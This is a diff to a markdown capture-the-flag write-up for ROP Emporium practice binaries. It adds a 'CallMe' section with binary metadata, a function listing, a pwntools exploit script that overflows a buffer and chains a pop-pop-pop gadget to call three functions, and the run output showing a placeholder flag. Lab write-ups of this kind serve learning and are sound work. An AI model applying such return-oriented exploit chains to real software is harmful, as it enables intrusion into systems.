@@ -89,7 +89,7 @@ You there madam, may I have your input please? And don't worry about null bytes,
 
 > Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
 ```
-## 1)
+## 1) Split
 ### Rabin2
 ```
 [root:~/Downloads/RopEmporium]# rabin2 -I split
@@ -241,5 +241,137 @@ split by ROP Emporium
 64bits
 
 Contriving a reason to ask user for data...
+> ROPE{a_placeholder_32byte_flag!}
+```
+## 2) CallMe
+### Rabin2
+```
+[root:~/Downloads/RopEmporium]# rabin2 -I callme    
+arch     x86
+baddr    0x400000
+binsz    11375
+bintype  elf
+bits     64
+canary   false
+sanitiz  false
+class    ELF64
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    ./
+static   false
+stripped false
+subsys   linux
+va       true
+```
+### GDB Functions
+```
+pwndbg> info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x00000000004017c0  _init
+0x00000000004017f0  puts@plt
+0x0000000000401800  printf@plt
+0x0000000000401810  callme_three@plt
+0x0000000000401820  memset@plt
+0x0000000000401830  __libc_start_main@plt
+0x0000000000401840  fgets@plt
+0x0000000000401850  callme_one@plt
+0x0000000000401860  setvbuf@plt
+0x0000000000401870  callme_two@plt
+0x0000000000401880  exit@plt
+0x0000000000401890  __gmon_start__@plt
+0x00000000004018a0  _start
+0x00000000004018d0  deregister_tm_clones
+0x0000000000401910  register_tm_clones
+0x0000000000401950  __do_global_dtors_aux
+0x0000000000401970  frame_dummy
+0x0000000000401996  main
+0x0000000000401a05  pwnme
+0x0000000000401a57  usefulFunction
+0x0000000000401ab0  usefulGadgets
+0x0000000000401ac0  __libc_csu_init
+0x0000000000401b30  __libc_csu_fini
+0x0000000000401b34  _fini
+pwndbg> 
+```
+### Exploit
+```
+# Import the library
+from pwn import *
+
+# Debugging
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("callme")
+
+# Variables
+callme_one = p64(elf.symbols["callme_one"])
+callme_two = p64(elf.symbols["callme_two"])
+callme_three = p64(elf.symbols["callme_three"])
+# Pop, pop, pop ret - pops all our arguments onto the stacl
+popreg = p64(0x0000000000401ab0)
+
+# Pack the arguments for the functions we want to call
+payload = "a" * 40
+payload += popreg
+payload += p64(0x1)
+payload += p64(0x2)
+payload += p64(0x3)
+payload += callme_one
+payload += popreg
+payload += p64(0x1)
+payload += p64(0x2)
+payload += p64(0x3)
+payload += callme_two
+payload += popreg
+payload += p64(0x1)
+payload += p64(0x2)
+payload += p64(0x3)
+payload += callme_three
+
+io = elf.process()
+#gdb.attach(io)
+# b *pwnme+79
+io.sendline(payload)
+data = io.recvall()
+print(data)
+```
+### Results
+```
+[root:~/Downloads/RopEmporium]# python exploit-callme-x64.py
+[*] '/root/Downloads/RopEmporium/callme'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RPATH:    './'
+[+] Starting local process '/root/Downloads/RopEmporium/callme': pid 28268
+[+] Receiving all data: Done (99B)
+[*] Process '/root/Downloads/RopEmporium/callme' stopped with exit code 0 (pid 28268)
+callme by ROP Emporium
+64bits
+
+Hope you read the instructions...
 > ROPE{a_placeholder_32byte_flag!}
 ```
